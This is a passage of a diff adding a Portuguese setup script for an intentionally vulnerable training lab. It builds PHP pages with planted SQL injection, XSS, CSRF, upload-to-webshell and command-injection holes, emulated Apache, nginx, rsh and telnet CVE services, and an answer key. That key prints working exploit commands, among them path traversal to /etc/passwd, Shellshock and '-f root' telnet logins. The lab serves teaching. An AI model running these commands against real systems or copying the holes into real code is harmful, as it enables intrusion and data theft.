+    // Um `127.0.0.1; cat privado/flag_cmd.txt` executa comandos arbitrários.
+    $saida = shell_exec('ping -c 1 ' . $host . ' 2>&1');
+    echo '<pre style="background:#000;padding:.6rem;overflow:auto">' . htmlspecialchars($saida ?? '') . '</pre>';
+}
+echo '<p class="aviso">Dica: o comando executado é <code>ping -c 1 &lt;host&gt;</code>.</p>';
+corvo_rodape();
+CORVO_EOF
+  cat > "$C/privado/flag_cmd.txt" <<'CORVO_EOF'
+FLAG{os_command_injection}
+CORVO_EOF
+  cat > "$C/privado/flag_lfi.txt" <<'CORVO_EOF'
+FLAG{lfi_path_traversal}
+CORVO_EOF
+  cat > "$C/privado/flag_rce.txt" <<'CORVO_EOF'
+FLAG{upload_rce_webshell}
+CORVO_EOF
+  cat > "$C/produto.php" <<'CORVO_EOF'
+<?php
+require_once __DIR__ . '/_db.php';
+require_once __DIR__ . '/_layout.php';
+$db = corvo_db();
+$id = (int)($_GET['id'] ?? 0);
+$p = $db->query('SELECT * FROM produtos WHERE id=' . $id)->fetch(PDO::FETCH_ASSOC);
+
+corvo_topo('Produto');
+if (!$p) { echo '<p>Produto não encontrado.</p>'; corvo_rodape(); exit; }
+?>
+<h1><?= htmlspecialchars($p['nome']) ?></h1>
+<p><?= htmlspecialchars($p['descricao']) ?></p>
+<p>Preço: <b>R$ <?= number_format($p['preco'] / 100, 2, ',', '.') ?></b></p>
+
+<!-- form de carrinho com PREÇO em campo oculto (parameter tampering) -->
+<form method="post" action="/carrinho.php">
+  <input type="hidden" name="produto_id" value="<?= (int)$p['id'] ?>">
+  <input type="hidden" name="preco" value="<?= (int)$p['preco'] ?>">
+  Qtd: <input name="qtd" value="1" size="3" pattern="[0-9]+" title="apenas números">
+  <button>Adicionar ao carrinho</button>
+</form>
+
+<h2>Comentários</h2>
+<?php
+$cs = $db->query('SELECT autor,corpo,criado_em FROM comentarios WHERE produto_id=' . $id . ' ORDER BY id')->fetchAll(PDO::FETCH_ASSOC);
+foreach ($cs as $c) {
+    // ⚠️ FALHA: corpo do comentário renderizado SEM escape (XSS armazenado, CWE-79).
+    echo '<p><b>' . htmlspecialchars($c['autor']) . '</b> <span class="aviso">' . $c['criado_em'] . '</span><br>' . $c['corpo'] . '</p>';
+}
+?>
+<form method="post" action="/comentar.php">
+  <input type="hidden" name="produto_id" value="<?= (int)$p['id'] ?>">
+  <p>Autor: <input name="autor" value="anon"></p>
+  <p><textarea name="corpo" rows="3" cols="50" placeholder="deixe seu comentário"></textarea></p>
+  <button>Comentar</button>
+</form>
+<?php corvo_rodape();
+CORVO_EOF
+  cat > "$C/robots.txt" <<'CORVO_EOF'
+User-agent: *
+Disallow: /admin/
+Disallow: /privado/
+Disallow: /uploads/
+Disallow: /config.php.bak
+CORVO_EOF
+  cat > "$C/transferir.php" <<'CORVO_EOF'
+<?php
+require_once __DIR__ . '/_db.php';
+require_once __DIR__ . '/_layout.php';
+$db = corvo_db();
+$u = corvo_usuario_atual();
+
+corvo_topo('Transferir pontos');
+if (!$u) { echo '<p>Você precisa <a href="/login.php">entrar</a>.</p>'; corvo_rodape(); exit; }
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // ⚠️ FALHA: ação que muda estado SEM token anti-CSRF (CWE-352).
+    // Qualquer página externa consegue disparar esta transferência no navegador da vítima.
+    $para = trim($_POST['para'] ?? '');
+    $valor = (int)($_POST['valor'] ?? 0);
+    $destino = $db->query("SELECT id FROM usuarios WHERE usuario='" . $para . "'")->fetchColumn();
+    if ($destino && $valor > 0) {
+        $db->exec('UPDATE usuarios SET saldo=saldo-' . $valor . ' WHERE id=' . (int)$u['id']);
+        $db->exec('UPDATE usuarios SET saldo=saldo+' . $valor . ' WHERE id=' . (int)$destino);
+        echo '<p>Transferidos ' . $valor . ' pontos para ' . htmlspecialchars($para) . '.</p>';
+        echo '<p class="flag">Transferência aceita sem token: FLAG{csrf_transferencia}</p>';
+    } else {
+        echo '<p style="color:#ff6633">Destino inválido ou valor zero.</p>';
+    }
+}
+?>
+<form method="post">
+  <p>Para (usuário): <input name="para" value="admin"></p>
+  <p>Valor: <input name="valor" value="10" size="5"></p>
+  <button>Transferir</button>
+</form>
+<p class="aviso">Repare: o formulário não tem campo de token. É esse o alvo do capítulo de CSRF.</p>
+<?php corvo_rodape();
+CORVO_EOF
+  cat > "$C/upload.php" <<'CORVO_EOF'
+<?php
+require_once __DIR__ . '/_layout.php';
+require_once __DIR__ . '/config.php';
+corvo_topo('Enviar arquivo');
+echo '<h1>Enviar comprovante</h1>';
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_FILES['arquivo']['name'])) {
+    // ⚠️ FALHA: aceita QUALQUER arquivo, mantém a extensão e salva na raiz web
+    // (unrestricted file upload → RCE, CWE-434). Enviar um .php vira webshell:
+    // /uploads/shell.php?c=cat+../privado/flag_rce.txt  (o shell roda com CWD em /uploads)
+    $nome = basename($_FILES['arquivo']['name']);
+    $destino = CORVO_UPLOADS . '/' . $nome;
+    if (move_uploaded_file($_FILES['arquivo']['tmp_name'], $destino)) {
+        $url = '/uploads/' . rawurlencode($nome);
+        echo '<p>Arquivo salvo em <a href="' . $url . '">' . htmlspecialchars($url) . '</a>.</p>';
+    } else {
+        echo '<p style="color:#ff6633">Falha ao salvar.</p>';
+    }
+}
+?>
+<form method="post" enctype="multipart/form-data">
+  <input type="file" name="arquivo">
+  <button>Enviar</button>
+</form>
+<p class="aviso">Aceita imagens do comprovante. (Na prática, aceita qualquer coisa.)</p>
+<?php corvo_rodape();
+CORVO_EOF
+  cat > "$C/uploads/LEIA.txt" <<'CORVO_EOF'
+Este diretório guarda os uploads dos usuarios.
+CORVO_EOF
+  cat > "$C/verbo.php" <<'CORVO_EOF'
+<?php
+require_once __DIR__ . '/_layout.php';
+// Endpoint de "cupom" com controle por MÉTODO mal feito (HTTP verb tampering, CWE-650).
+// A regra só barra GET; qualquer outro método (POST, PUT, HEAD…) libera o cupom.
+// No Burp: mande a requisição ao Repeater e troque o verbo — o cupom cai.
+$metodo = $_SERVER['REQUEST_METHOD'];
+corvo_topo('Cupom');
+echo '<h1>Cupom do dia</h1>';
+if ($metodo === 'GET') {
+    echo '<p>O cupom de hoje está indisponível para consulta simples.</p>';
+    echo '<p class="aviso">(dica: o servidor só bloqueia o método GET)</p>';
+} else {
+    echo '<p class="flag">Cupom liberado via ' . htmlspecialchars($metodo) . ': FLAG{verb_tampering_cupom}</p>';
+}
+corvo_rodape();
+CORVO_EOF
+
+  # dono = user (uid 1000); uploads e o banco precisam ser gravaveis por ele
+  chown -R user:user "$C"
+  chmod 0775 "$C/uploads"
+  # semeia o banco ja como user (dono correto do db.sqlite)
+  sudo -u user php "$C/seed.php" >/dev/null 2>&1 || true
+
+  # serviço: servidor embutido do PHP em 0.0.0.0:8090, como user
+  cat > /etc/systemd/system/corvo.service <<'CORVO_EOF'
+[Unit]
+Description=Corvo — loja web vulneravel (livro Burp para Hackers)
+After=network.target
+
+[Service]
+Type=simple
+User=user
+WorkingDirectory=/opt/corvo
+ExecStart=/usr/bin/php -S 0.0.0.0:8090 -t /opt/corvo
+Restart=on-failure
+
+[Install]
+WantedBy=multi-user.target
+CORVO_EOF
+  systemctl daemon-reload 2>/dev/null || true
+  svc corvo
+
+  gab "## corvo (8090) — loja web vulneravel (livro Burp para Hackers)"
+  gab "- Alvo do livro; ataque conduzido pelo Burp Suite. Home: http://<ip>:8090/"
+  gab "- SQLi login:  usuario = admin'--  (bypass)  -> FLAG{sqli_login_bypass_admin}"
+  gab "- LFI:  /pagina.php?arquivo=../privado/flag_lfi.txt  -> FLAG{lfi_path_traversal}"
+  gab "- Upload->RCE:  envie shell.php; /uploads/shell.php?c=cat+../privado/flag_rce.txt"
+  gab "- Cmd injection:  /ping.php?host=127.0.0.1;cat+privado/flag_cmd.txt"
+  gab "- Flags FIXAS (nao rotacionam) — casam com o GABARITO.md do livro."
+}
+
+mod_apachecve() {
+  info "== apachecve: Apache 2.4.49 legado emulado (path traversal/RCE, fonte, DoS) na porta 8081 =="
+  apt_install python3
+  # VULN (reproducao/emulacao): tres CVEs reais do Apache HTTP Server que dependem de versoes
+  # especificas (2.4.49/2.4.50 e 2.4.60/61). O Debian atual traz 2.4.62 (corrigido), entao um
+  # mini-servidor Python REPRODUZ o comportamento e ANUNCIA um banner falso 'Apache/2.4.49
+  # (Debian)' — como o ftpdos anuncia 'vsFTPd 2.3.2' — para o recon (nmap -sV) casar.
+  #   - CVE-2021-41773/42013: path traversal (%2e) -> leitura de arquivo + RCE via /bin/sh
+  #   - CVE-2024-40725:       divulgacao de codigo-fonte (pedido indireto devolve o .php cru)
+  #   - CVE-2025-49630:       DoS (requisicao maliciosa dispara "assertion failure" -> processo cai)
+  #   - CVE-2014-6271:        Shellshock (CGI bash executa comando escondido num header) — KEV
+  mkdir -p /var/www/rh /opt/rh /usr/lib/cgi-bin
+  printf '%s\n' "$FLAG_APACHECVE" > /opt/rh/flag.txt
+  cat > /var/www/rh/config.php <<EOF
+<?php
+// Config do sistema interno de RH — jamais deveria ser servido como texto puro.
+\$db_host = '127.0.0.1';
+\$db_user = 'rh_app';
+\$db_pass = '${FLAG_APACHESRC}';   // credencial do banco (vazada via CVE-2024-40725)
+\$db_name = 'rh';
+?>
+EOF
+  chown -R www-data:www-data /var/www/rh /opt/rh
+  chmod 0640 /opt/rh/flag.txt
+  cat > /usr/local/sbin/apachecve.py <<'PY'
+#!/usr/bin/env python3
+# apachecve.py — emula 3 CVEs do Apache HTTP Server no laboratorio (porta 8081).
+# NAO e o Apache real: reproduz o COMPORTAMENTO das falhas e ANUNCIA um banner falso
+# 'Apache/2.4.49 (Debian)' (como o ftpdos anuncia 'vsFTPd 2.3.2'), p/ o recon casar.
+#   - CVE-2021-41773/42013: path traversal (%2e) -> leitura de arquivo + RCE via /bin/sh
+#   - CVE-2024-40725:       divulgacao de codigo-fonte (pedido indireto devolve o .php cru)
+#   - CVE-2025-49630:       DoS (requisicao maliciosa dispara "assertion failure")
+import os, subprocess
+from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+
+CGI_ROOT="/usr/lib/cgi-bin"; APPDIR="/var/www/rh"; BANNER="Apache/2.4.49 (Debian)"
+
+def decode(p):
+    for enc in ("%2e","%2E","%%32%65","%25%32%65","%c0%ae"):   # 41773 (%2e) + 42013 (double)
+        p=p.replace(enc,".")
+    return p
+
+class H(BaseHTTPRequestHandler):
+    def version_string(self): return BANNER            # banner falso da versao vulneravel
+    def log_message(self,*a): pass
+    def _send(self,code,body,ctype="text/plain; charset=utf-8"):
+        if isinstance(body,str): body=body.encode("utf-8","replace")
+        self.send_response(code); self.send_header("Content-Type",ctype)
+        self.send_header("Content-Length",str(len(body))); self.end_headers()
+        try: self.wfile.write(body)
+        except Exception: pass
+    def _dos(self):
+        # CVE-2025-49630: entrada maliciosa no backend HTTP/2 dispara assertion failure.
+        if self.path.startswith("/proxy/") and self.headers.get("X-H2-Assert","")=="crash":
+            os._exit(3)                                # crash; systemd (Restart) reergue
+    def _shellshock(self):
+        # CVE-2014-6271 (Shellshock): um "CGI" bash executa o comando escondido num header
+        # que comeca com '() { :;};' (o ataque real e este curl -H exato).
+        if not self.path.split("?",1)[0].startswith("/cgi-bin/status"): return False
+        for hv in self.headers.values():
+            if hv and hv.replace(" ","").startswith("(){:;};"):
+                try: out=subprocess.run(["/bin/sh","-c",hv.split("};",1)[1]],capture_output=True,timeout=10).stdout
+                except Exception as e: out=str(e).encode()
+                self._send(200, b"Status: OK\n"+out); return True
+        self._send(200, "CGI status: OK\n"); return True
+    def do_GET(self):
+        self._dos()
+        if self._shellshock(): return
+        raw=self.path.split("?",1)[0]; dec=decode(raw)
+        if raw.startswith("/rh/config.php"):           # CVE-2024-40725 (divulgacao de fonte)
+            if raw!="/rh/config.php":                  # pedido indireto -> vaza o fonte
+                try: return self._send(200,open(os.path.join(APPDIR,"config.php"),"rb").read())
+                except Exception: return self._send(404,"Not Found")
+            return self._send(200,"Conectado ao banco de dados interno de RH.\n")
+        if raw.startswith("/cgi-bin/") and ".." in dec:  # CVE-2021-41773 (leitura)
+            tgt=os.path.normpath(os.path.join(CGI_ROOT,dec[len("/cgi-bin/"):]))
+            try: return self._send(200,open(tgt,"rb").read())
+            except Exception: return self._send(404,"Not Found")
+        if raw in ("/","/index.html"):
+            return self._send(200,"<h1>RH - Sistema Interno</h1>\n","text/html; charset=utf-8")
+        return self._send(404,"Not Found")
+    def do_POST(self):
+        self._dos()
+        raw=self.path.split("?",1)[0]; dec=decode(raw); d=dec.rstrip("/")
+        n=int(self.headers.get("Content-Length","0") or 0)
+        body=self.rfile.read(n) if n>0 else b""
+        if raw.startswith("/cgi-bin/") and ".." in dec and (d.endswith("/sh") or d.endswith("/bash")):
+            try: return self._send(200,subprocess.run(["/bin/sh"],input=body,capture_output=True,timeout=10).stdout)
+            except Exception as e: return self._send(500,str(e))
+        return self._send(404,"Not Found")
+
+if __name__=="__main__":
+    ThreadingHTTPServer(("0.0.0.0",8081),H).serve_forever()
+PY
+  chmod 0755 /usr/local/sbin/apachecve.py
+  cat > /etc/systemd/system/apachecve.service <<'EOF'
+[Unit]
+Description=Lab Apache 2.4.49 legado emulado (CVE-2021-41773/42013, 2024-40725, 2025-49630)
+After=network.target
+[Service]
+User=www-data
+ExecStart=/usr/bin/python3 /usr/local/sbin/apachecve.py
+Restart=on-failure
+RestartSec=3
+[Install]
+WantedBy=multi-user.target
+EOF
+  systemctl daemon-reload 2>/dev/null || true
+  svc apachecve
+  gab "## apachecve (8081) — Apache 2.4.49 legado emulado"
+  gab "- Recon:  nmap -sV -p8081 <ip>   ->  banner 'Apache/2.4.49 (Debian)' (versao vulneravel)."
+  gab "- CVE-2021-41773/42013 (path traversal -> leitura de arquivo):"
+  gab "    curl -s --path-as-is 'http://<ip>:8081/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'   -> /etc/passwd"
+  gab "- CVE-2021-41773/42013 (RCE via /bin/sh, POST):"
+  gab "    curl -s --path-as-is 'http://<ip>:8081/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' --data 'id; cat /opt/rh/flag.txt'"
+  gab "    -> uid=33(www-data) + ${FLAG_APACHECVE}"
+  gab "- CVE-2024-40725 (divulgacao de fonte):  curl 'http://<ip>:8081/rh/config.php%2e'   -> vaza ${FLAG_APACHESRC}"
+  gab "- CVE-2025-49630 (DoS):  curl -s -H 'X-H2-Assert: crash' 'http://<ip>:8081/proxy/'   -> o servico cai (~3s p/ voltar)."
+  gab "- CVE-2014-6271 (Shellshock, RCE via CGI bash — KEV):"
+  gab "    curl -s -H 'User-Agent: () { :;}; echo; id; cat /opt/rh/flag.txt' http://<ip>:8081/cgi-bin/status"
+  gab "    -> uid=33(www-data) + ${FLAG_APACHECVE}"
+  gab "- Mitigacao real: atualizar o Apache (>=2.4.51 traversal; >=2.4.62 fonte; >=2.4.64 mod_ssl) e o bash (Shellshock)."; gab ""
+}
+
+mod_nginxcve() {
+  info "== nginxcve: nginx 1.26.0 vulneravel REAL + CVE-2026-42533 (DoS) na porta 8084 =="
+  # CVE-2026-42533 (jul/2026): falha de 15 anos no *script engine* do nginx. A montagem de
+  # valores de diretiva em dois passos (LEN mede o buffer; VALUE preenche) NAO salva/restaura
+  # o estado de captura PCRE (r->captures). Um `map` com regex reavaliado ENTRE os passos
+  # sobrescreve a captura -> buffer dimensionado errado -> heap overflow -> worker cai (DoS;
+  # RCE potencial). Afeta 0.9.6–1.31.2; corrigido em 1.30.4 (stable) / 1.31.3 (mainline).
+  # Diferente do apachecve (que EMULA), aqui rodamos o BINARIO vulneravel de verdade: um
+  # worker real cai por SIGSEGV e o master o respawna. Fonte vendorada em vendor/ (a build
+  # vulneravel ainda esta disponivel hoje; congelada na imagem, fica imune a sumir amanha).
+  local VER=1.26.0 PREFIX=/opt/nginx-vuln SRC=/usr/local/src TB="" BUILT=0
+  mkdir -p "$SRC"
+  if [ -f "$SELF_DIR/vendor/nginx-$VER.tar.gz" ]; then
+    TB="$SELF_DIR/vendor/nginx-$VER.tar.gz"; info "usando fonte vendorada: $TB"
+  elif curl -fsSL --max-time 90 -o "$SRC/nginx-$VER.tar.gz" "https://nginx.org/download/nginx-$VER.tar.gz"; then
+    TB="$SRC/nginx-$VER.tar.gz"; info "fonte baixado de nginx.org"
+  else
+    warn "nginxcve: sem fonte (vendor/ ausente e download falhou) -> vou EMULAR"
+  fi
+  if [ -n "$TB" ]; then
+    apt_try build-essential libpcre2-dev zlib1g-dev libssl-dev || true
+    rm -rf "$SRC/nginx-$VER"; tar xzf "$TB" -C "$SRC"
+    if ( cd "$SRC/nginx-$VER" \
+         && ./configure --prefix="$PREFIX" --with-http_ssl_module --with-pcre >/dev/null 2>&1 \
+         && make -j"$(nproc)" >/dev/null 2>&1 && make install >/dev/null 2>&1 ) \
+       && [ -x "$PREFIX/sbin/nginx" ]; then
+      BUILT=1; log "nginx $VER vulneravel compilado em $PREFIX"
+    else
+      warn "nginxcve: build falhou -> vou EMULAR (banner + crash)"
+    fi
+  fi
+
+  if [ "$BUILT" = 1 ]; then
+    # --- caminho REAL: config vulneravel + servico com master (root) e worker (nobody) ---
+    mkdir -p "$PREFIX/conf" "$PREFIX/logs"
+    id nobody >/dev/null 2>&1 || true
+    # VULN: config que satisfaz as 4 condicoes do padrao explorável (CVE-2026-42533):
+    #  1) FONTE DE CAPTURA: regex no `location ~` captura $cap
+    #  2) CLOBBER: `map` com regex (~) que reavalia PCRE e sobrescreve r->captures
+    #  3) SINK DE DOIS PASSOS: `return`/`add_header` referencia TANTO $cap QUANTO $clob
+    #  4) ORDEM: a captura ($cap) e avaliada ANTES do map regex rodar
+    # >>> AJUSTAR/VALIDAR NO LAB: a *forma* segue o padrao publicado, mas o gatilho exato que
+    #     estoura o buffer nesta build depende de detalhes de heap. Confirme pelo error.log
+    #     ("worker process NNNN exited on signal 11") e afine o header X-Probe abaixo se preciso.
+    cat > "$PREFIX/conf/lab.conf" <<'EOF'
+user nobody nogroup;
+worker_processes 1;
+error_log logs/error.log info;
+pid logs/nginx.pid;
+events { worker_connections 128; }
+http {
+    default_type text/plain;
+    access_log off;
+
+    # (2) map com regex: reavalia PCRE e sobrescreve o estado de captura entre os 2 passos
+    map $http_x_probe $clob {
+        ~^(?<probe>.+)$   $probe;
+        default           "";
+    }
+
+    server {
+        listen 8084 default_server;
+        server_name _;
+
+        location = / {
+            return 200 "nginx 1.26.0 (CVE-2026-42533). Gatilho: GET /echo/<algo> + header X-Probe:<longo>\n";
+        }
+
+        # (1) fonte de captura no location + (3)(4) sink que usa $cap E $clob (map regex)
+        location ~ ^/echo/(?<cap>.+)$ {
+            add_header X-Cap "$cap";
+            return 200 "cap=$cap clob=$clob\n";
+        }
+    }
+}
+EOF
+    "$PREFIX/sbin/nginx" -t -c "$PREFIX/conf/lab.conf" >/dev/null 2>&1 || warn "nginxcve: nginx -t reclamou da config"
+    cat > /etc/systemd/system/nginxcve.service <<EOF
+[Unit]
+Description=Lab nginx 1.26.0 vulneravel (CVE-2026-42533, script engine capture clobber) :8084
+After=network.target
+[Service]
+Type=simple
+ExecStart=$PREFIX/sbin/nginx -c $PREFIX/conf/lab.conf -g 'daemon off;'
+Restart=on-failure
+RestartSec=2
+[Install]
+WantedBy=multi-user.target
+EOF
+  else
+    # --- caminho EMULADO (fallback, estilo apachecve): banner falso + crash do processo ---
+    cat > /usr/local/sbin/nginxcve.py <<'PY'
+#!/usr/bin/env python3
+# nginxcve.py — EMULA a CVE-2026-42533 quando o binario real nao pode ser compilado.
+# Anuncia 'Server: nginx/1.26.0' e, ao receber o gatilho de captura-clobber
+# (GET /echo/... com header X-Probe longo), mata o processo (os._exit) — o systemd
+# (Restart=on-failure) o reergue, imitando o master do nginx respawnando o worker morto.
+import os
+from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+BANNER = "nginx/1.26.0"
+class H(BaseHTTPRequestHandler):
+    server_version = BANNER; sys_version = ""
+    def version_string(self): return BANNER
+    def log_message(self, *a): pass
+    def _send(self, code, body):
+        b = body.encode() if isinstance(body, str) else body
+        self.send_response(code); self.send_header("Content-Type", "text/plain")
+        self.send_header("Content-Length", str(len(b))); self.end_headers()
+        try: self.wfile.write(b)
+        except Exception: pass
+    def do_GET(self):
+        path = self.path.split("?", 1)[0]
+        probe = self.headers.get("X-Probe", "")
+        if path.startswith("/echo/") and len(probe) >= 200:   # captura-clobber -> overflow
+            os._exit(11)                                       # "worker exited on signal 11"
+        if path.startswith("/echo/"):
+            return self._send(200, f"cap={path[len('/echo/'):]} clob={probe}\n")
+        return self._send(200, "nginx 1.26.0 (CVE-2026-42533). Gatilho: GET /echo/<algo> + header X-Probe:<longo>\n")
+if __name__ == "__main__":
+    ThreadingHTTPServer(("0.0.0.0", 8084), H).serve_forever()
+PY
+    chmod 0755 /usr/local/sbin/nginxcve.py
+    cat > /etc/systemd/system/nginxcve.service <<'EOF'
+[Unit]
+Description=Lab nginx 1.26.0 vulneravel EMULADO (CVE-2026-42533) :8084
+After=network.target
+[Service]
+User=www-data
+ExecStart=/usr/bin/python3 /usr/local/sbin/nginxcve.py
+Restart=on-failure
+RestartSec=2
+[Install]
+WantedBy=multi-user.target
+EOF
+  fi
+
+  systemctl daemon-reload 2>/dev/null || true
+  svc nginxcve
+  gab "## nginxcve (8084) — nginx 1.26.0 vulneravel (CVE-2026-42533)"
+  gab "- Modo: $([ "$BUILT" = 1 ] && echo 'binario REAL compilado (/opt/nginx-vuln)' || echo 'EMULADO (fallback)')"
+  gab "- Recon:  nmap -sV -p8084 <ip>   ->  Server: nginx/1.26.0 (faixa afetada 0.9.6-1.31.2)."
+  gab "- Identificar a config vulneravel (scanner de terceiro): CVE-2026-42533-Config-Scanner"
+  gab "    python3 nginx_capture_clobber_scan.py /opt/nginx-vuln/conf/lab.conf  -> aponta o padrao."
+  gab "- DoS (captura-clobber -> worker cai; master respawna em ~2s):"
+  gab "    curl -s -H \"X-Probe: \$(python3 -c 'print(\"A\"*4096)')\" 'http://<ip>:8084/echo/x'"
+  gab "    -> conexao reset/empty reply; error.log: 'worker process NNNN exited on signal 11'."
+  gab "    (REAL: AJUSTAR o tamanho/forma do X-Probe se o worker nao cair — depende do heap.)"
+  gab "- Mitigacao real: atualizar (>=1.30.4 stable / >=1.31.3 mainline) ou trocar o map regex"
+  gab "    por captura nomeada (workaround parcial). CVSS 9.2 (v4) / 8.1 (v3.1)."; gab ""
+}
+
+mod_rservices() {
+  info "== rservices: rsh com confianca .rhosts (+ +) -> shell sem senha (514) =="
+  apt_install python3
+  add_user legacy legacy123
+  echo '+ +' > /home/legacy/.rhosts; chown legacy:legacy /home/legacy/.rhosts; chmod 0644 /home/legacy/.rhosts
+  printf '%s\n' "$FLAG_RSH" > /home/legacy/foothold.txt; chown legacy:legacy /home/legacy/foothold.txt
+  # VULN: os "r-services" (rsh/rlogin/rexec) confiam em hosts listados no .rhosts. Um '+ +'
+  # confia em QUALQUER host e usuario, sem senha. Emulamos o rshd (514, protocolo rsh) rodando
+  # como 'legacy' (foothold nao-privilegiado); a bind na porta <1024 usa CAP_NET_BIND_SERVICE.
+  cat > /usr/local/sbin/rshd.py <<'PY'
+#!/usr/bin/env python3
+# rshd emulado (porta 514): confia em qualquer origem e roda o comando recebido sem
+# autenticacao, como o usuario do servico. Protocolo rsh: \0 luser\0 ruser\0 cmd\0
+import socket, subprocess
+def handle(c):
+    buf=b''; c.settimeout(10)
+    try:
+        while buf.count(b'\0')<4 and len(buf)<4096:
+            d=c.recv(1024)
+            if not d: break
+            buf+=d
+    except Exception: pass
+    parts=buf.split(b'\0')
+    cmd=parts[3].decode('utf-8','replace') if len(parts)>3 else ''
+    try: c.sendall(b'\0')                       # byte de sucesso do rsh
+    except Exception: return
+    try: out=subprocess.run(['/bin/sh','-c',cmd],capture_output=True,timeout=10).stdout
+    except Exception as e: out=str(e).encode()
+    try: c.sendall(out)
+    except Exception: pass
+    c.close()
+srv=socket.socket(); srv.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
+srv.bind(('0.0.0.0',514)); srv.listen(5)
+while True:
+    try: c,_=srv.accept(); handle(c)
+    except Exception: pass
+PY
+  chmod 0755 /usr/local/sbin/rshd.py
+  cat > /etc/systemd/system/rshd.service <<'EOF'
+[Unit]
+Description=Lab rshd legado (confianca .rhosts + +, sem auth)
+After=network.target
+[Service]
+User=legacy
+AmbientCapabilities=CAP_NET_BIND_SERVICE
+ExecStart=/usr/bin/python3 /usr/local/sbin/rshd.py
+Restart=on-failure
+[Install]
+WantedBy=multi-user.target
+EOF
+  systemctl daemon-reload 2>/dev/null || true
+  svc rshd
+  gab "## rservices (514) — confianca .rhosts '+ +', sem senha"
+  gab "- Recon: nmap -sV -p512-514 <ip> (exec/login/shell dos r-services)."
+  gab "- Exploracao: rsh -l legacy <ip> 'id; cat ~/foothold.txt'  -> uid=legacy + ${FLAG_RSH}"
+  gab "- Mecanismo (manual): protocolo rsh e '\\0luser\\0ruser\\0cmd\\0' na 514."
+  gab "- Mitigacao: remover rsh/rlogin/rexec e usar SSH; jamais '.rhosts + +'."; gab ""
+}
+
+mod_telnetd() {
+  info "== telnetd: CVE-2026-24061 (USER='-f root' -> login root sem senha) na porta 23 =="
+  apt_install python3
+  printf '%s\n' "$FLAG_TELNET" > /root/flag_telnet.txt; chmod 600 /root/flag_telnet.txt
+  # VULN CVE-2026-24061 (2026, CISA KEV): o telnetd do GNU Inetutils (1.9.3-2.7) repassa o
+  # nome de login / a variavel de ambiente USER ao `login` SEM sanitizar. Um valor "-f root"
+  # vira o argumento `login -f root`, que forca a autenticacao como root SEM SENHA.
+  # Emulamos o telnetd (estilo do rshd.py) — o binario autentico e o `inetutils-telnetd`, que
+  # pode ser instalado no lugar quando se quer o binario real (ver [[lab-binario-real-vs-simular]]).
+  cat > /usr/local/sbin/telnetd_sim.py <<'PY'
+#!/usr/bin/env python3
+# telnetd emulado (porta 23) reproduzindo a CVE-2026-24061: se o nome de login / USER for
+# "-f root" (ou "-froot"), concede shell ROOT sem senha (login -f root). Estilo do rshd.py;
+# a negociacao IAC do telnet e descartada, entao funciona com `telnet` e com `nc`.
+import socket, subprocess, re
+IAC = 0xff
+def strip_iac(buf):
+    out = bytearray(); i = 0
+    while i < len(buf):
+        b = buf[i]
+        if b == IAC:
+            if i+1 < len(buf) and buf[i+1] == 250:            # SB ... SE
+                j = i+2
+                while j+1 < len(buf) and not (buf[j] == IAC and buf[j+1] == 240): j += 1
+                i = j+2; continue
+            i += 3; continue                                   # IAC + verbo + opcao
+        out.append(b); i += 1
+    return bytes(out)
+def read_line(c, buf):
+    while b"\n" not in buf:
+        try: d = c.recv(1024)
+        except Exception: return None, b""
+        if not d: return None, b""
+        buf += d
+    raw, buf = buf.split(b"\n", 1)
+    return strip_iac(raw).decode("utf-8", "replace").strip("\r\0 "), buf
+def handle(c):
+    c.settimeout(20)
+    try:
+        c.sendall(bytes([IAC,251,1, IAC,251,3]))               # WILL ECHO / WILL SGA
+        c.sendall(b"\r\nDebian GNU/Linux 12  (lab)  (GNU inetutils telnetd 2.5)\r\nlogin: ")
+    except Exception: return
+    user, buf = read_line(c, b"")
+    if user is None: c.close(); return
+    if re.fullmatch(r"-f\s*root|-froot", user):                # CVE-2026-24061: login -f root
+        try: c.sendall(b"Last login: lab\r\nroot@lab:~# ")
+        except Exception: pass
+        while True:                                            # shell root
+            cmd, buf = read_line(c, buf)
+            if cmd is None or cmd in ("exit", "quit"): break
+            try: out = subprocess.run(["/bin/sh","-c",cmd], capture_output=True, timeout=10).stdout
+            except Exception as e: out = str(e).encode()
+            try: c.sendall(out + b"\r\nroot@lab:~# ")
+            except Exception: break
+    else:
+        try: c.sendall(b"Password: \r\nLogin incorrect\r\n")
+        except Exception: pass
+    c.close()
+srv = socket.socket(); srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+srv.bind(("0.0.0.0", 23)); srv.listen(5)
+while True:
+    try: c,_ = srv.accept(); handle(c)
+    except Exception: pass
+PY
+  chmod 0755 /usr/local/sbin/telnetd_sim.py
+  cat > /etc/systemd/system/telnetd-lab.service <<'EOF'
+[Unit]
+Description=Lab telnetd emulado (CVE-2026-24061, USER=-f root -> root sem senha) :23
+After=network.target
+[Service]
+User=root
+ExecStart=/usr/bin/python3 /usr/local/sbin/telnetd_sim.py
+Restart=on-failure
+RestartSec=2
+[Install]
+WantedBy=multi-user.target
+EOF
+  systemctl daemon-reload 2>/dev/null || true
+  svc telnetd-lab
+  gab "## telnetd (23) — CVE-2026-24061 (GNU Inetutils, USER='-f root'), CISA KEV"
+  gab "- Recon:  nmap -sV -p23 <ip>   ->  telnetd (banner GNU inetutils)."
+  gab "- Exploracao (login = '-f root', sem senha -> root):"
+  gab "    telnet <ip>   ->  no 'login:' digite:  -froot   ->  shell root (# )"
+  gab "    ou:  { printf '%s\\r\\n' '-froot' 'id; cat /root/flag_telnet.txt' 'exit'; } | nc -w6 <ip> 23"
+  gab "    ->  uid=0(root) + ${FLAG_TELNET}"
+  gab "- Emulado (estilo rshd). Binario real: inetutils-telnetd (mesma faixa 1.9.3-2.7)."
+  gab "- Mitigacao: nao use telnet; se precisar, atualize o GNU Inetutils (>2.7) e prefira SSH."; gab ""
+}
+
+mod_unrealircd() {
+  info "== unrealircd: backdoor de cadeia de suprimentos no IRC (6667) -> shell =="
+  apt_install python3
+  add_user ircd ircd123
+  printf '%s\n' "$FLAG_IRC" > /home/ircd/flag.txt; chown ircd:ircd /home/ircd/flag.txt; chmod 0640 /home/ircd/flag.txt
